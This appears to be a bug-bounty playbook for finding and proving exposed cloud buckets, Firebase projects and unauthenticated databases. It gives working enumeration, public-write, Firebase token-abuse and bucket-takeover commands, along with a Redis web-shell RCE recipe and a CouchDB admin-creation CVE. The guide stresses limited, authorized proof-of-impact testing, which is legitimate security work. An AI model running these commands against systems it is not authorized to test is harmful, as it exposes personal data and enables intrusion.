# Cloud Storage & Backend-as-a-Service Exposure — Mass PII + Cloud Takeover

> The single highest-yield unauth bucket for **mass PII** and **cloud takeover**. One misconfigured bucket, one open Firebase, one exposed Elasticsearch = millions of records with zero auth. This file is the systematic playbook.

**Scope discipline:** read enough to prove impact — *one* object listing, *one* record, *one* config key — then STOP. Never bulk-download PII. Never write outside a single timestamped marker file. Quantify impact from metadata (object count, index `docs.count`), not by exfiltrating.

---

## 0. The mass-PII / cloud-takeover surface map

| Surface | Where it leaks | Impact ceiling |
|---|---|---|
| **AWS S3** | JS/HTML refs, `*.s3.amazonaws.com`, CNAME, name-guess | Mass PII read; **public-write → supply-chain XSS**; bucket takeover |
| **GCS** | `storage.googleapis.com/<bucket>`, `<bucket>.storage.googleapis.com` | Mass PII; public-write; `allUsers`/`allAuthenticatedUsers` IAM |
| **Azure Blob** | `*.blob.core.windows.net`, `?comp=list` | Mass PII; anonymous container; **dangling → subdomain+blob takeover** |
| **DO Spaces / Linode / Scaleway / R2 / Wasabi** | S3-compatible endpoints | Same as S3 (S3Scanner covers all) |
| **Firebase RTDB** | `*.firebaseio.com/.json`, `apiKey:AIza…` in JS | `.read:true` → **entire DB unauth**; `.write:true` → tamper |
| **Firestore** | `firestore.googleapis.com/v1/projects/…` | Open rules → all documents unauth |
| **Firebase Storage** | `firebasestorage.googleapis.com/v0/b/…` | Open rules → all user uploads (Tea App: 72k IDs + 1.1M DMs) |
| **Firebase Auth** | exposed `AIza…` API key | `accounts:signUp` → anon token → auth-gated data |
| **Elasticsearch / Kibana** | `:9200/_cat/indices`, `:5601` | No-auth-by-default → full index dump |
| **MongoDB** | `:27017` no auth | Full DB dump |
| **Redis** | `:6379` no auth | Data + **`CONFIG SET dir` → RCE** |
| **CouchDB / Cassandra / Solr / RethinkDB** | `:5984/_all_dbs`, `:8983`, `:8098` | Full data + CouchDB CVE-2017-12635 admin creation |

---

## 1. Candidate name generation (do this first)

Buckets/projects are found by **reference** (best) then **guess**.

```bash
T=acme.com ; ORG=acme ; BASE=${T%.*}

# (a) Harvest references — highest signal, zero guessing
grep -rhoE '[a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com'  js/ crawled.txt urls.* 2>/dev/null | sort -u
grep -rhoE 's3\.amazonaws\.com/[a-z0-9._-]+'                js/ crawled.txt urls.* 2>/dev/null | sort -u
grep -rhoE '[a-z0-9._-]+\.storage\.googleapis\.com'         js/ crawled.txt urls.* 2>/dev/null | sort -u
grep -rhoE 'storage\.googleapis\.com/[a-z0-9._-]+'          js/ crawled.txt urls.* 2>/dev/null | sort -u
grep -rhoE '[a-z0-9]+\.blob\.core\.windows\.net'            js/ crawled.txt urls.* 2>/dev/null | sort -u
grep -rhoE '[a-z0-9-]+\.firebaseio\.com'                    js/ crawled.txt urls.* 2>/dev/null | sort -u
grep -rhoE 'AIza[0-9A-Za-z_-]{35}'                          js/          2>/dev/null | sort -u  # Firebase/GCP key

# (b) GrayhatWarfare — public bucket index (passive, no traffic to target)
#   https://buckets.grayhatwarfare.com/  (search $ORG, $BASE) — also has an API

# (c) Generate permutations for brute
for kw in $ORG $BASE $T; do
  for suf in "" -prod -production -stage -staging -dev -test -backup -backups -assets -media -static \
             -uploads -files -data -db -dump -logs -public -private -internal -cdn -images -user-data \
             -exports -reports -pii -documents -invoices -bucket -storage -s3 -web -app; do
    for pre in "" prod- dev- stage- backup- assets- static- cdn-; do
      echo "${pre}${kw}${suf}"
    done
  done
done | sort -u > bn.txt
```

---

## 2. AWS S3 — enumerate, classify, exploit

```bash
# Best: S3Scanner reports the exact permission set (Read/Write/ReadACP/WriteACP/FullControl)
#       across S3-compatible providers (AWS, GCP, DO, Linode, Scaleway, custom endpoints)
s3scanner -bucket-file bn.txt -enumerate

# Or per-bucket, no credentials
for b in $(cat bn.txt); do
  aws s3 ls "s3://$b" --no-sign-request 2>/dev/null && echo "[READ] $b"
done

# Region / existence via HTTP (no aws-cli)
for b in $(cat bn.txt); do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://$b.s3.amazonaws.com/")
  echo "$code  $b"          # 200=public-list  403=exists-private  404=free (takeover?)
done
```

**Classify the response:**
- **200 + XML `<ListBucketResult>`** → public list. Pull `<Key>` names, count them, read ONE to prove PII.
- **403 AccessDenied** → exists but private. Still test **public-write** and **object-level** reads (a private-list bucket often serves individual objects publicly).
- **404 NoSuchBucket** → free name → **bucket-takeover** candidate if a live subdomain CNAMEs/redirects to it (see §9).

**Public-write PoC (only in scope, marker file only):**
```bash
echo "authorized-bounty-poc $(date -u +%FT%TZ)" > poc.txt
aws s3 cp poc.txt "s3://$b/bbp-poc-$(date +%s).txt" --no-sign-request && echo "[WRITE] $b"
# Impact if bucket serves site JS/assets → attacker-controlled JS on every page → ATO at scale.
```
**Write-ACP / Full-Control** = you can flip the whole bucket public or hijack ACLs → escalate the finding, don't just note read.

---

## 3. GCS (Google Cloud Storage)

```bash
for b in $(cat bn.txt); do
  # Anonymous JSON list
  curl -s "https://storage.googleapis.com/storage/v1/b/$b/o?maxResults=5" \
    | grep -q '"items"' && echo "[LIST] gs://$b"
  # Public read of the bucket root
  curl -s -o /dev/null -w '%{http_code} '"$b"'\n' "https://storage.googleapis.com/$b/"
done

# IAM misconfig — the real GCS bug: allUsers / allAuthenticatedUsers bound to a role
for b in $(cat bn.txt); do
  curl -s "https://storage.googleapis.com/storage/v1/b/$b/iam" \
    | grep -E 'allUsers|allAuthenticatedUsers' && echo "  ^ public IAM on $b"
done
gsutil iam get "gs://$b" 2>/dev/null   # if gsutil available
```
`allAuthenticatedUsers` = **any Google account** (not truly public but effectively so — any attacker with a free Gmail). Report it; triagers accept it.

---

## 4. Azure Blob

```bash
for b in $(cat bn.txt); do
  # Anonymous container listing
  for c in '$root' backups files data uploads public assets media documents; do
    url="https://$b.blob.core.windows.net/$c?restype=container&comp=list"
    curl -s "$url" | grep -q '<Blobs>' && echo "[LIST] $b/$c"
  done
done
# Account-level container discovery
curl -s "https://$b.blob.core.windows.net/?comp=list"
```
Azure blob names that resolve to a **deleted storage account** = dangling → takeover (see subdomain-takeover.md, Azure edge cases).

---

## 5. Firebase — the mass-PII machine (2024–2025's biggest source)

Real cases: 19M plaintext passwords across misconfigured instances; **Tea App** leaked ~72k user IDs + 1.1M private messages via an open Firebase Storage bucket. The bug is almost always `.read:true`.

### 5a. Find the project
```bash
grep -rhoE '"?apiKey"?\s*[:=]\s*"AIza[0-9A-Za-z_-]{35}"' js/            # web config
grep -rhoE '[a-z0-9-]+\.firebaseio\.com' js/                            # RTDB URL
grep -rhoE '"projectId"\s*:\s*"[a-z0-9-]+"' js/                         # project id
# APK: apktool d app.apk ; find . -name google-services.json
```

### 5b. Realtime Database (RTDB) — open read/write
```bash
PID=acme-prod       # projectId / db name

curl -s "https://$PID.firebaseio.com/.json?shallow=true"    # top-level keys, cheap
curl -s "https://$PID.firebaseio.com/.json"                 # 200+data = FULL DB unauth
curl -s "https://$PID.firebaseio.com/users.json"            # target a collection
# Regional DBs (newer projects):
curl -s "https://$PID-default-rtdb.<region>.firebasedatabase.app/.json?shallow=true"

# Write test (marker only, in scope) — proves .write:true
curl -s -X PUT -d '{"bbp_poc":"authorized"}' "https://$PID.firebaseio.com/bbp_poc_$(date +%s).json"
```
`"error":"Permission denied"` = locked (good). JSON body = leak.

### 5c. Firestore — open rules
```bash
curl -s "https://firestore.googleapis.com/v1/projects/$PID/databases/(default)/documents"
curl -s "https://firestore.googleapis.com/v1/projects/$PID/databases/(default)/documents/users"
```
Returns documents without a Bearer token = open. `PERMISSION_DENIED` = locked.

### 5d. Firebase Storage — open buckets (Tea App class)
```bash
curl -s "https://firebasestorage.googleapis.com/v0/b/$PID.appspot.com/o?maxResults=100"
curl -s "https://firebasestorage.googleapis.com/v0/b/$PID.firebasestorage.app/o?maxResults=100"
curl -s "https://firebasestorage.googleapis.com/v0/b/$PID.appspot.com/o?prefix=users/"
# Download one to prove (redact in report):
curl -s "https://firebasestorage.googleapis.com/v0/b/$PID.appspot.com/o/<url-enc-name>?alt=media"
```

### 5e. Firebase Auth abuse (exposed AIza key → token → auth-gated data)
```bash
KEY=AIza...    # from JS
# Anonymous signup -> real idToken
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$KEY" \
  -H 'Content-Type: application/json' -d '{"returnSecureToken":true}'
# Use idToken against rules that trust "auth != null" (extremely common):
curl -s "https://$PID.firebaseio.com/.json?auth=<idToken>"
```
If DB rules are `auth != null` (not `false`), the anon signup token unlocks everything — a *very* common escalation that beats a naive "it's locked" conclusion.

**Tooling:** `OpenFirebase` (scans all Firebase services + APK config + collection fuzzing), `FireSploit`, `firebaseExploiter`.

---

## 6. Exposed databases — direct mass-PII (no auth by default)

Found in Phase-2 port scan. These ship insecure-by-default and are perennial mass-PII P1s.

```bash
H=db.acme.com

# Elasticsearch (9200) — no auth by default
curl -s "http://$H:9200/_cat/indices?v"                     # index list + docs.count
curl -s "http://$H:9200/_search?size=1&q=*:*" | head -c 800 # ONE doc to prove PII
curl -s "http://$H:9200/_cat/indices?v" | grep -iE 'user|customer|order|pii|email|kyc'

# Kibana (5601) — often unauth, proxies ES
curl -s "http://$H:5601/api/status" ; # then app/dev_tools console

# MongoDB (27017)
mongosh "mongodb://$H:27017" --eval 'db.adminCommand({listDatabases:1})' 2>/dev/null
# or: mongo --host $H --eval 'db.getMongo().getDBNames()'

# Redis (6379) — data AND RCE path
redis-cli -h $H PING        # PONG w/o AUTH = open
redis-cli -h $H INFO keyspace
redis-cli -h $H --scan | head    # sample keys (don't dump)
#   RCE escalation: CONFIG SET dir /var/www ; CONFIG SET dbfilename shell.php ; SET x '<?php…'; SAVE
#   or SLAVEOF module load. PROVE reachability only unless RCE is explicitly in scope.

# CouchDB (5984)
curl -s "http://$H:5984/_all_dbs"
curl -s "http://$H:5984/_users/_all_docs"   # CVE-2017-12635: PUT _users doc → admin creation

# Others: Cassandra 9042, RethinkDB 28015/8080, Memcached 11211 (stats/get), Solr 8983 (/solr/#/)
```
**Report shape:** `"Unauthenticated <engine> on <host:port> exposes N indices / M documents incl. <PII types>."` Prove with `_cat/indices` counts + one redacted record. Do NOT dump.

---

## 7. Quantify impact WITHOUT exfiltration

| Surface | Count without downloading |
|---|---|
| S3 list | `aws s3 ls s3://b --recursive --no-sign-request \| wc -l` (stop early) or read `<KeyCount>` |
| Firebase RTDB | `?shallow=true` key count |
| Firebase Storage | `o?maxResults=1` → `nextPageToken` presence + a sample |
| Elasticsearch | `_cat/indices?v` → `docs.count` column |
| MongoDB | `db.stats()` / `count()` per collection |

One record + a count is a complete P1 PoC. Anything more is over-collection.

---

## 8. Escalation chains (this is what makes it a P1, not an info-leak)

- **Public bucket serving site JS/assets + public-write** → overwrite a `.js` bundle → stored XSS on **every** customer → mass ATO. (Highest ceiling.)
- **Bucket contains `.env` / `config.json` / DB dump / `.pem`** → creds → pivot (→ secrets-recon.md, → §RCE).
- **Firebase `.write:true`** → tamper balances/roles/flags, or write an XSS payload rendered in an admin panel.
- **Leaked cloud key in the bucket** → IAM enumeration → account takeover (→ secrets-recon.md §leaked-key).
- **Open ES/Mongo with password hashes / reset tokens** → offline crack / direct ATO.

Lead the report with the **chain and the record count**, not "bucket is public."

---

## 9. Cloud storage TAKEOVER (dangling resource)

A live subdomain points (CNAME/redirect/HTML ref) at a bucket that **no longer exists** → claim the name → serve content from the target's origin.

```bash
# Signal: subdomain 404s with a provider "no such bucket/site" fingerprint
dig +short assets.acme.com          # -> acme-assets.s3.amazonaws.com
curl -s https://assets.acme.com/    # -> "The specified bucket does not exist"

# Confirm the name is free, then (in scope) create it in your account, upload a marker index,
# and show it renders on the victim subdomain. Same play for GCS, Azure Blob, DO Spaces.
```
Impact = full content control on a target-branded subdomain → phishing, cookie theft (if cookie-scoped to parent), CSP/OAuth-origin abuse. See `subdomain-takeover.md`.

---

## Tooling cheat-sheet

```
s3scanner cloud_enum lazys3 bucket_finder s3enum gcpbucketbrute      # buckets
grayhatwarfare (web/API)                                              # passive bucket index
OpenFirebase firebaseExploiter FireSploit                            # firebase
pacu enumerate-iam ScoutSuite cloudsplaining                         # post-key cloud
naabu nmap (9200/27017/6379/5984/…)  redis-cli mongosh               # exposed DBs
```

## One-line report leads (copy, then fill counts)
- `[Unauth] Public S3 bucket <b> exposes <N> objects incl. <PII> — read+write, JS served from it → XSS→ATO`
- `[Unauth] Firebase RTDB <pid> world-readable — <N> user records (email, phone, hashed pw) via /.json`
- `[Unauth] Elasticsearch <host:9200> — <N> indices / <M> docs incl. customer PII, no auth`
- `[Takeover] Dangling S3 CNAME on <sub>.<tld> — bucket free, content-control PoC attached`
